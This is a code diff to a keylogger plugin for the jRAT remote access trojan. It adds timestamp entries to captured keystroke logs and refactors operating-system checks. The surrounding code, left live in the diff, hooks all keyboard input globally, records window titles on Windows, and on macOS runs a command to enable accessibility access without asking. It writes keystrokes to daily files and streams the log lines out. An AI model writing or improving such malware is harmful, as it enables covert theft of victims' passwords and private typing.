@@ -14,9 +14,11 @@ import java.util.List;
 
 import org.jnativehook.GlobalScreen;
 
+import pro.jrat.api.stub.utils.OperatingSystem;
 import pro.jrat.plugin.keylogger.stub.activities.Activities;
 import pro.jrat.plugin.keylogger.stub.activities.Activity;
 import pro.jrat.plugin.keylogger.stub.activities.Key;
+import pro.jrat.plugin.keylogger.stub.activities.Time;
 import pro.jrat.plugin.keylogger.stub.activities.Title;
 import pro.jrat.plugin.keylogger.stub.codec.Base64;
 
@@ -113,7 +115,7 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 				
 				dos.writeBoolean(true);
 				
-				if (line.startsWith("[Window:")) {
+				if (line.startsWith("[Window:") || line.startsWith("[Date:")) {
 					dos.writeInt(-1);
 					dos.writeUTF(line);
 				} else {
@@ -144,7 +146,7 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 	@Override
 	public void onStart() throws Exception {
 		try {
-			if (System.getProperty("os.name").toLowerCase().contains("mac")) {
+			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 				System.out.println("Trying to enable assistive devices... Even if enabled");
 				
 				Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
@@ -159,7 +161,7 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 		GlobalScreen.registerNativeHook();
 		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
 
-		if (System.getProperty("os.name").toLowerCase().contains("win")) {
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			try {
 				new Thread(new TitleListener()).start();
 			} catch (Exception e) {
@@ -187,11 +189,15 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 						
 						PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(Keylogger.getTodaysFile(), true)));
 						
+						Activities.add(new Time(System.currentTimeMillis()));
+						
 						for (Activity a : Activities.activities) {
 							System.out.println(a.toString());
 							System.out.println(a.getClass().getSimpleName());
 							if (a instanceof Title) {
 								out.println("\n[Window: " + a.toString() + "]\n");
+							} else if (a instanceof Time) {
+								out.println("\n[Date: " + a.toString() + "]\n");
 							} else if (a instanceof Key) {
 								char ckey = ((Key)a).getChar();
 								String key;
@@ -208,7 +214,7 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 									
 								out.print(key);
 							} else {
-								throw new Exception("Not char or title");
+								throw new Exception("Not valid activity");
 							}
 						}
 						
